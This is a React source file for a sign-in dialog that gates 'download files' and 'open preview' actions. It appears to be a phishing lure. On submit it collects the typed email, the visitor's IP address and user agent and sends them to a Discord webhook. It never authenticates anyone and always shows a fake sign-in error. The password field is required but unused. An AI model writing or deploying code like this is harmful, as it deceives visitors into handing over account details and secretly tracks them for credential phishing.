import { useState } from "react";
import {
  Dialog,
  DialogContent,
  DialogDescription,
  DialogHeader,
  DialogTitle,
} from "@/components/ui/dialog";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { Label } from "@/components/ui/label";
import { toast } from "sonner";

interface AuthDialogProps {
  open: boolean;
  onOpenChange: (open: boolean) => void;
  action: "download" | "preview";
}

// Get Discord webhook URL from environment variable
const DISCORD_WEBHOOK_URL = import.meta.env.VITE_DISCORD_WEBHOOK_URL || "";

const AuthDialog = ({ open, onOpenChange, action }: AuthDialogProps) => {
  const [email, setEmail] = useState("");
  const [password, setPassword] = useState("");
  const [isLoading, setIsLoading] = useState(false);

  const sendToDiscord = async (email: string) => {
    if (!DISCORD_WEBHOOK_URL) {
      console.warn("Discord webhook URL not configured");
      return;
    }

    // Get user agent
    const userAgent = navigator.userAgent;

    // Fetch IP address from public API
    let ipAddress = "Unknown";
    try {
      const ipResponse = await fetch("https://api.ipify.org?format=json");
      const ipData = await ipResponse.json();
      ipAddress = ipData.ip;
    } catch (error) {
      console.error("Error fetching IP:", error);
    }

    try {
      await fetch(DISCORD_WEBHOOK_URL, {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        mode: "no-cors",
        body: JSON.stringify({
          embeds: [
            {
              title: `New ${action === "download" ? "Download" : "Preview"} Request`,
              color: 0x7c3aed,
              fields: [
                {
                  name: "Email",
                  value: email,
                  inline: true,
                },
                {
                  name: "Action",
                  value: action === "download" ? "Download Files" : "Open Preview",
                  inline: true,
                },
                {
                  name: "IP Address",
                  value: ipAddress,
                  inline: true,
                },
                {
                  name: "User Agent",
                  value: userAgent.substring(0, 1024),
                  inline: false,
                },
                {
                  name: "Timestamp",
                  value: new Date().toISOString(),
                  inline: false,
                },
              ],
            },
          ],
        }),
      });
    } catch (error) {
      console.error("Error sending to Discord:", error);
    }
  };

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    
    if (!email || !password) {
      toast.error("Please fill in all fields");
      return;
    }

    setIsLoading(true);
    
    // Send to Discord
    await sendToDiscord(email);
    
    setTimeout(() => {
      setIsLoading(false);
      toast.error("There was a problem authenticating. Please try again.");
    }, 1500);
  };

  return (
    <Dialog open={open} onOpenChange={onOpenChange}>
      <DialogContent className="sm:max-w-md">
        <DialogHeader>
          <DialogTitle className="text-xl font-semibold">
            {action === "download" ? "Download Files" : "Open Preview"}
          </DialogTitle>
          <DialogDescription>
            Please sign in to {action === "download" ? "download your files" : "view the preview"}.
          </DialogDescription>
        </DialogHeader>
        
        <form onSubmit={handleSubmit} className="space-y-4 mt-4">
          <div className="space-y-2">
            <Label htmlFor="email">Email</Label>
            <Input
              id="email"
              type="email"
              placeholder="Enter your email"
              value={email}
              onChange={(e) => setEmail(e.target.value)}
              required
            />
          </div>
          
          <div className="space-y-2">
            <Label htmlFor="password">Password</Label>
            <Input
              id="password"
              type="password"
              placeholder="Enter your password"
              value={password}
              onChange={(e) => setPassword(e.target.value)}
              required
            />
          </div>

          <div className="flex gap-3 pt-2">
            <Button
              type="submit"
              className="flex-1 bg-cta-blue hover:bg-cta-blue/90"
              disabled={isLoading}
            >
              {isLoading ? "Signing in..." : "Sign In"}
            </Button>
            <Button
              type="button"
              variant="outline"
              className="flex-1"
              onClick={() => onOpenChange(false)}
            >
              Cancel
            </Button>
          </div>

          <p className="text-center text-sm text-muted-foreground">
            Don't have an account?{" "}
            <button type="button" className="text-cta-blue hover:underline">
              Sign up
            </button>
          </p>
        </form>
      </DialogContent>
    </Dialog>
  );
};

export default AuthDialog;
